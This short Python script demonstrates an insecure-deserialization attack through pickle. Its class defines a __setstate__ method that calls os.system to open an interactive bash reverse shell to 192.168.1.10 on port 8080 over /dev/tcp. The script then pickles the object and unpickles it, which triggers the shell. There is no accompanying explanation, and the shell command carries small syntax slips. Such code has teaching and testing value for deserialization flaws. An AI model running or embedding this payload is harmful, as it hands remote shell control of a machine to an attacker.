import pickle
import os


class foobar:
    
    def __init__(self):
        pass
    
    def __getstate__(self):
        return self.__dict__
    
    def __setstate__(self, state):
        os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.10:8080 0&>1"')
        
my_foobar = foobar()
my_pickle = pickle.dumps(my_foobar)
my_unpickle = pickle.loads(my_pickle)